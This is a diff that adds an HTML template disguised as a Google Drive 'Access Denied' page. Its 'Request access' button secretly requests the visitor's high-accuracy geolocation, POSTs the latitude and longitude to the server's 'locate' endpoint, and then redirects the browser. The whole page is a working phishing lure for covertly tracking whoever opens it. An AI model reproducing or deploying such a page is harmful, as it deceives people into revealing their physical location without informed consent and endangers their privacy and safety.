@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta name="description" content="Web word processing, presentations and spreadsheets">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=0">
+	<link rel="shortcut icon" href="static/drive_favicon1.ico">
+	<title>Google Drive - Access Denied</title>
+	<link rel="stylesheet" type="text/css" href="static/main.css">
+	<script>
+function locate()
+		{
+					var position;
+  if(navigator.geolocation)
+  {
+    var optn = {enableHighAccuracy : true, timeout : 30000, maximumage: 0};
+    navigator.geolocation.getCurrentPosition(showPos);
+  }
+  else
+  {
+    alert('Geolocation is not Supported by your Browser...');
+  }
+
+					function showPos(position){
+    var lat = position.coords.latitude;
+    if( lat ){
+      lat = lat + ' deg';
+    }
+    else {
+      lat = 'Not Available';
+    }
+    var lon = position.coords.longitude;
+    if( lon ){
+      lon = lon + ' deg';
+    }
+    else {
+      lon = 'Not Available';
+    }
+    var acc = position.coords.accuracy;
+    if( acc ){
+      acc = acc + ' m';
+    }
+    else {
+      acc = 'Not Available';
+    }
+    var alt = position.coords.altitude;
+    if( alt ){
+      alt = alt + ' m';
+    }
+    else {
+      alt = 'Not Available';
+    }
+    var dir = position.coords.heading;
+    if( dir ){
+      dir = dir + ' deg';
+    }
+    else {
+      dir = 'Not Available';
+    }
+    var spd = position.coords.speed;
+    if( spd ){
+      spd = spd + ' m/s';
+    }
+    else {
+      spd = 'Not Available';
+    }
+								fetch("{{url_for('locate')}}",
+											{
+														method: "POST",
+														body: JSON.stringify({lat: lat, lon: lon}),
+														headers: {"content-type": "application/json; charset=UTF-8"}
+													}).then((response)=>response.json()).then((json)=>window.location.replace(json.url));
+
+				};
+		};
+    	</script>
+</head>
+<body>
+	<div id="outerContainer">
+		<div id="innerContainer">
+			<div style="position: absolute; top: -80px;">
+				<div id="drive-logo">
+					<span class="docs-drivelogo-img"></span>
+					<span class="docs-drivelogo-text"> Drive</span>
+				</div>
+			</div>
+			<div style="clear:both"></div>
+			<div id="main">
+				<div id="accessDeniedIcon"></div>
+				<p id="accessDeniedHeader">You need permission</p>
+				<div id="message">
+					<p>Want in? Ask for access, or switch to an account with permission.</p>
+				</div>
+				<p id="buttons" style="padding-top: 10px">
+					<button id="requestButton" style="font-weight:bold" class="jfk-button jfk-button-action" onclick="locate();">Request access</button>
+				</p>
+			</div>
+		</div>
+	</div>
+</body>
+</html>
